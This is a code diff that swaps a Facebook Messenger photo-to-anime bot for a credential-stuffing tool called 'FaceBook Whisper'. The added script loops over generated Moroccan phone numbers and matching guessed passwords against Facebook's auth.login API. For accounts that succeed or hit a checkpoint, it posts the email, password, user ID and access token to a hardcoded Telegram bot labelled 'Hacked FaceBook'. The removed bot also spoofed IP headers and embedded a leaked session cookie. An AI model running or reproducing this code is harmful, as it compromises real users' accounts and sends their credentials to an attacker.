@@ -1,201 +1,80 @@
-import { generateImagesLinks } from 'bimg';
-import fs from 'fs';
-import { Blob, FormData } from 'formdata-node';
-import express from 'express';
-import bodyParser from 'body-parser';
-import dotenv from 'dotenv';
-import Botly from 'botly';
-import fetch from 'node-fetch';
 import axios from 'axios';
-dotenv.config();
-
+import figlet from 'figlet';
+import colors from 'colors';
+import express from 'express';
 const app = express();
-const port = 8080;
-const PageID = "245492821986982";
-let userStatus = {};
-/*--------- page database ---------*/
-const botly = new Botly({
-  accessToken: process.env.PAGE_ACCESS_TOKEN,
-  verifyToken: process.env.VERIFY_TOKEN,
-  webHookPath: process.env.WB_PATH,
-  notificationType: Botly.CONST.REGULAR,
-  FB_URL: "https://graph.facebook.com/v18.0/",
+const port = 3000;
+
+app.get('/', (res) => {
+  res.send('Hello World!')
 });
 
-/*--------- Functions ---------*/
-app.get("/", function (_req, res) {
-  res.sendStatus(200);
-});
-app.use(
-  bodyParser.json({
-    verify: botly.getVerifySignature(process.env.APP_SECRET),
-  })
-);
-app.use(bodyParser.urlencoded({ extended: false }));
-app.use("/webhook", botly.router());
-botly.on("message", async (senderId, message, data) => {
-  //aaaaaaaaaaaaa
-  botly.sendAction({id: senderId, action: Botly.CONST.ACTION_TYPES.MARK_SEEN});
-  botly.sendAction({id: senderId, action: Botly.CONST.ACTION_TYPES.TYPING_ON});
 
-  /*--------- s t a r t ---------*/
-  if (message.message.text) {
-    botly.sendText({id: senderId, text: "يرجى ارسال الصور فقط ❤️"});
-    } else if (message.message.attachments[0].payload.sticker_id) {
-      botly.sendText({id: senderId, text: "(Y)"}) ;
-    } else if (message.message.attachments[0].type == "image") {
-    if (userStatus[senderId]) {
-      botly.sendText({id: senderId, text: "رجاءا انتظر حتى يتم توليد الصورة الخاصة برسالتك السابقة ❤️"});
-    } else {
-      userStatus[senderId] = true;
+console.clear();
+console.log(figlet.textSync('FaceBook') + colors.yellow("Whisper </>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));
+console.log(`FB: ${colors.cyan('OussamaBakrine')}`);
+console.log(colors.yellow("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));
 
-    botly.sendText({id: senderId, text: "جاري تحويل صورتك الى شكل انمي ❤️⏳"});
+const ID = '1758975211';
+const tok = '7160121436:AAEb846gUsrXPjPTw5t2ERT1zNxqkZzd9nA';
+const user = '1234567890';
 
-const attachment = message.message.attachments[0] 
-        const url = attachment.payload.url;
-    fetch(url).then(res => res.buffer()).then(buffer => {
-        jadianime(buffer.toString('base64')).then(tuanime => {
-            botly.sendImage({
-                id: senderId,
-                url: 'https://www.drawever.com' + tuanime.urls[1],
-                is_reusable: true
-            }, (err, data) => {
-                console.log("image sent");
-            });
-        });
-    });
-      userStatus[senderId] = false;
-    
-    }
-    } else if (message.message.attachments[0].type == "audio") {
-      botly.sendText({id: senderId, text: "يرجى ارسال النصوص فقط ❤️"});
-        } else if (message.message.attachments[0].type == "video") {
-      botly.sendText({id: senderId, text: "يرجى ارسال النصوص فقط ❤️"});
-    }
-  /*--------- e n d ---------*/
-//botly.sendAction({id: senderId, action: Botly.CONST.ACTION_TYPES.TYPING_OFF}); 
-});
-botly.on("postback", async (senderId, message, postback, data, ref) => {
- //aaaaaaaaaa
-  botly.sendAction({id: senderId, action: Botly.CONST.ACTION_TYPES.MARK_SEEN});
-  //aaaaaaaa
-  botly.sendAction({id: senderId, action: Botly.CONST.ACTION_TYPES.TYPING_ON});
-    /*--------- s t a r t ---------*/
-    if (message.postback){ // Normal (buttons)
-    if (postback == "GET_STARTED"){           botly.sendGeneric({id: senderId, elements: {
-                title: "سعيد بلقاءك ❤️، انا هنا لتحويل كل ما في بالك الى صور ابداعية 😍",
-                image_url: "https://telegra.ph/file/77edfdf7b35823caf90f6.jpg",
-                subtitle: "ارسل نصا لكي احوله الى صورة ❤️",
-                buttons: [
-                  botly.createPostbackButton("مطور البوت 🇲🇦😄", "Owner"),
-                ]}, aspectRatio: Botly.CONST.IMAGE_ASPECT_RATIO.HORIZONTAL});
-        
-    } else if (postback == "Owner") {
-        botly.sendGeneric({id: senderId, elements: {
-           title: "Morocco AI",
-           image_url: "https://telegra.ph/file/6db48bb667028c068d85a.jpg",
-           subtitle: " اضغط لمتابعة الصفحة ❤️👇🏻",
-           buttons: [
-              botly.createWebURLButton("صفحة المطور 🇲🇦😄", "https://www.facebook.com/profile.php?id=100090780515885")]},
-            aspectRatio: Botly.CONST.IMAGE_ASPECT_RATIO.HORIZONTAL});
-      } else if (postback == "bots") {
-      botly.sendText({id: senderId, text: `قائمة روبوتاتنا 🇲🇦😍`,
-      quick_replies: [
-         botly.createQuickReply("Atlas-GPT", "Atlas-GPT")]});
-    }
-  } else { // Quick Reply
-   if (postback == "Owner") {
-      botly.sendGeneric({id: senderId, elements: {
-         title: "Morocco AI",
-         image_url: "https://telegra.ph/file/6db48bb667028c068d85a.jpg",
-         subtitle: "صفحة المطور 🇲🇦😄",
-         buttons: [
-            botly.createWebURLButton("مطور البوت 🇲🇦😍", "fb.com/Morocco.Openai")]},
-          aspectRatio: Botly.CONST.IMAGE_ASPECT_RATIO.HORIZONTAL});
-     }
-  }
-   /*--------- e n d ---------*/
- //aaaaa
-  botly.sendAction({id: senderId, action: Botly.CONST.ACTION_TYPES.TYPING_OFF});
-});
-/*------------- RESP -------------*/
-botly.setGetStarted({pageId: PageID, payload: "GET_STARTED"});
-botly.setGreetingText({
-    pageId: PageID,
-    greeting: [
-      {
-        locale: "default",
-        text: "CatBot - Image Generator Bot\nهو روبوت لتحويل نص الى صور واقعية 😯\n❤️🇲🇦"
-      }
-    ]
-  });
-botly.setPersistentMenu({
-    pageId: PageID,
-    menu: [
-        {
-          locale: "default",
-          composer_input_disabled: false,
-          call_to_actions: [
-            {
-              type:  "web_url",
-              title: "صفحة المطور 🇲🇦😄",
-              url:   "fb.com/Morocco.Openai/",
-              webview_height_ratio: "full"
-            }
-          ]
+async function code_whisper(email, password) {
+    const url = 'https://api.facebook.com/method/auth.login';
+    const headers = {
+        'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+        'Accept-Language': 'en-US,en;q=0.5'
+    };
+    const data = {
+        'email': email,
+        'password': password,
+        'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+        'locale': "en_DZ",
+        'format': 'JSON'
+    };
+    const req = await axios.post(url, data, { headers: headers });
+    const id = req.data.uid;
+    const con = req.data.identifier;
+    const tkn = req.data.access_token;
+    const tlg = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${ID}&text=.💀. Hacked FaceBook From @OussamaBakrine💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.❤. ID ==> ${id}\n.✉. User ==> ${email} \n.🚫. Pass ==> ${password}\n.📨. Confirmed user ==> ${con}\n.📃. Access Token ==> ${tkn} \n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈`;
+    await axios.post(tlg);
+    console.log(colors.green(`victim : ${email} | ${password}`));
+}
+
+async function main() {
+    while (true) {
+        const whisper = Array.from({ length: 8 }, () => user[Math.floor(Math.random() * user.length)]).join('');
+        const email = '+2126' + whisper;
+        const password = '06' + whisper;
+        if (email === '' || password === '') {
+            process.exit();
         }
-      ]
-  });
-/*------------- RESP -------------*/
-app.listen(process.env.PORT || port, () =>
-  console.log(`App is on Port : ${port}`)
-)
-
-
-async function jadianime(image) {
-    return new Promise(async(resolve, reject) => {
-        const requestId = Math.random().toString(36).substring(7); 
-        const userAgent = getRandomUserAgent();
-        const ipAddress = generateRandomIP();
-        axios("https://www.drawever.com/api/photo-to-anime", {
-            headers: {
-                "content-type": "application/json",
-                "X-Request-ID": requestId,
-                "user-agent": userAgent,
-                "X-Forwarded-For": ipAddress,
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
-                "Cookie": "DRAWEVER_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2MDk4OWJlZDM5NzI3ODhiN2U1MjY0NCIsImVtYWlsIjoidGhlc2hhZG93YnJva2VyczEzM0BnbWFpbC5jb20iLCJmdWxsbmFtZSI6IlNoYWRvdyIsImNyZWRpdHMiOjAsImlhdCI6MTcxMTkwMTExOH0.TQmn5BBN4hrraSaggn9skoTJC7h7LDin9kq0zweSvdc",
-                "Referer": "https://www.drawever.com/process",
-                "Sec-Ch-Ua": "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
-                "Sec-Ch-Ua-Mobile": "?0",
-                "Sec-Ch-Ua-Platform": "\"Windows\"",
-                "Sec-Fetch-Dest": "document",
-                "Sec-Fetch-Mode": "navigate",
-                "Sec-Fetch-Site": "same-origin",
-                "Upgrade-Insecure-Requests": "1",
-            },
-            "data": { "data": "data:image/jpeg;base64," + image },
-            "method": "POST"
-        }).then(res => { 
-            let yanz = res.data
-            resolve(yanz)
-        }).catch(err => {
-            reject(err)
-        });
-    });
+        const url = 'https://api.facebook.com/method/auth.login';
+        const headers = {
+            'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+            'Accept-Language': 'en-US,en;q=0.5'
+        };
+        const data = {
+            'email': email,
+            'password': password,
+            'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            'locale': "en_DZ",
+            'format': 'JSON'
+        };
+        const req = await axios.post(url, data, { headers: headers });
+        if ('access_token' in req.data) {
+            await code_whisper(email, password);
+        } else if (req.data.error_msg.includes('(405)')) {
+            console.log(colors.yellow(`CheckPoint ${email}:${password}`));
+            await axios.post(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${ID}&text=.💀.Owner @oussamabakrine💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.\n.✉. E-mail ==> ${email} \n.🚫. PassWord ==> ${password} \n.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈 هق مشا.`);
+        } else {
+            console.log(colors.red(`num => ${email} | pass => ${password}`));
+        }
+    }
 }
 
-function getRandomUserAgent() {
-    const userAgents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36"
-    ];
-    return userAgents[Math.floor(Math.random() * userAgents.length)];
-}
+main();
 
-function generateRandomIP() {
-    const octet = () => Math.floor(Math.random() * 256);
-    return `${octet()}.${octet()}.${octet()}.${octet()}`;
-}
+app.listen(port, () => {
+  console.log(`Server is running at http://localhost:${port}`)
+});
